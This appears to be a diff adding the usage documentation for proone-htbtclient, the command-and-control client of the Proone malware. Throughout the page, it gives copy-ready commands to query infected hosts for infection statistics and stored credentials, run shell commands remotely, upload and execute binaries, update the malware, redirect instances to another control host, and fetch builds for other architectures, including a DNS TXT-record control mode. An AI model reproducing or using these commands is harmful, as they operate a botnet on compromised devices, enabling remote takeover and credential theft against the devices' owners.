@@ -1,0 +1,189 @@
+---
+title: proone-htbtclient
+description: Heartbeat protocol client for instance management
+---
+
+# proone-htbtclient
+
+Client tool for interacting with Proone instances using the Heartbeat protocol.
+
+## Overview
+
+proone-htbtclient provides command-line access to Proone instances for management, monitoring, and control operations. It supports both direct TLS connections and TXT record-based command-and-control.
+
+## Usage
+
+```bash
+proone-htbtclient [common options] <COMMAND> ...
+```
+
+## Common Options
+
+- `-h, --help`: Print help for specified command
+- `-V, --version`: Print version and exit
+- `-x`: Script mode (no terminal interaction)
+- `-v, --verbose`: Increase verbosity (can be used multiple times)
+- `-m <MODE>`: Mode selection: `tls` (default) or `txtrec`
+- `--tls-ca <FILE>`: Path to TLS CA certificate
+- `--tls-cert <FILE>`: Path to TLS client certificate
+- `--tls-key <FILE>`: Path to TLS private key
+- `--tls-key-pw <PW>`: Password for TLS private key
+- `-t, --host <REMOTE>`: Remote host to connect to
+- `-p, --port <PORT>`: Port number (default: 64420)
+
+## Commands
+
+### hostinfo
+
+Query host information from a Proone instance.
+
+```bash
+proone-htbtclient --tls-ca ca.crt --tls-cert client.crt --tls-key client.key \
+  -t 192.168.1.100 hostinfo
+```
+
+Outputs YAML format with:
+- Process uptimes and PIDs
+- Infection statistics
+- Program version UUID
+- Boot and instance IDs
+- Host credentials
+- Architecture and OS
+- Instance flags
+
+### hover
+
+Send a handover request to redirect the instance to a different Heartbeat host.
+
+```bash
+proone-htbtclient -t 192.168.1.100 hover \
+  --v4-addr 10.0.0.1 --v4-port 64420 \
+  --v6-addr fd00::1 --v6-port 64420
+```
+
+Options:
+- `--v4-addr <ADDR>`: IPv4 address
+- `--v6-addr <ADDR>`: IPv6 address
+- `--port <PORT>`: Set both v4 and v6 port
+- `--v4-port <PORT>`: Set IPv4 port
+- `--v6-port <PORT>`: Set IPv6 port
+
+### runcmd
+
+Run a command on the remote instance.
+
+```bash
+proone-htbtclient -t 192.168.1.100 runcmd -- /bin/ls -la
+proone-htbtclient -t 192.168.1.100 runcmd -d -- /bin/daemon
+```
+
+Options:
+- `-d, --detach`: Run detached (as daemon)
+
+### runbin
+
+Upload and run a binary on the remote instance.
+
+```bash
+proone-htbtclient -t 192.168.1.100 runbin /path/to/binary arg1 arg2
+proone-htbtclient -t 192.168.1.100 runbin -d /path/to/daemon
+```
+
+Options:
+- `-d, --detach`: Run detached (as daemon)
+
+### upbin
+
+Perform a binary update on the instance.
+
+```bash
+# Update with nybin (binary recombination)
+proone-htbtclient -t 192.168.1.100 upbin --nybin proone.nybin
+
+# Upload executable as-is
+proone-htbtclient -t 192.168.1.100 upbin --exec proone.linux.armv4t
+
+# Disable compatible architecture fallback
+proone-htbtclient -t 192.168.1.100 upbin --nybin --no-compat proone.nybin
+```
+
+Options:
+- `--nybin`: Binary is in nybin format (enables recombination)
+- `--exec`: Upload executable as-is
+- `--no-compat`: Do not retry with compatible architecture
+
+The instance will:
+1. Receive the new binary
+2. Write it to a temporary file
+3. Execute it with provided arguments
+4. Exit if successful (parent restarts with new binary)
+
+### rcb
+
+Request binary recombination and download the result.
+
+```bash
+# Download for specific architecture
+proone-htbtclient -t 192.168.1.100 rcb --arch mips output.bin
+
+# Self-copy (no recombination)
+proone-htbtclient -t 192.168.1.100 rcb output.bin
+
+# Output to stdout
+proone-htbtclient -t 192.168.1.100 rcb --arch armv4t -
+```
+
+Options:
+- `--arch <ARCH>`: Target CPU architecture (see proone-list-arch)
+- `--no-compat`: Disallow compatible architecture substitution
+- `-f`: Overwrite output file if it exists
+
+The default output is stdout (use `-` or omit the filename).
+
+## Output Format
+
+All commands output YAML with the structure:
+
+```yaml
+htbtclient_run:
+  preemble:
+    remote:
+      host: "192.168.1.100"
+      af: "INET"
+      addr: "192.168.1.100"
+      port: 64420
+    command: "hostinfo"
+    result: "ok"
+  body:
+    # Command-specific data
+```
+
+## TLS Verification
+
+- If `--tls-ca` is not provided, server verification is optional
+- Both `--tls-cert` and `--tls-key` must be provided together
+- Proone instances require client certificates by design
+- ALPN protocol "prne-htbt" must be negotiated
+
+## TXT Record Mode
+
+In `txtrec` mode:
+- Commands are encoded and output as TXT record payloads
+- No network connection is made
+- Use for DNS-based command-and-control
+
+```bash
+proone-htbtclient -m txtrec runcmd -- /bin/sh -c "echo test"
+```
+
+## Exit Codes
+
+| Code | Description |
+|------|-------------|
+| 0 | Success |
+| 1 | Runtime error |
+| 2 | Invalid arguments |
+
+## Source
+
+Location: `src/proone-htbtclient.c`
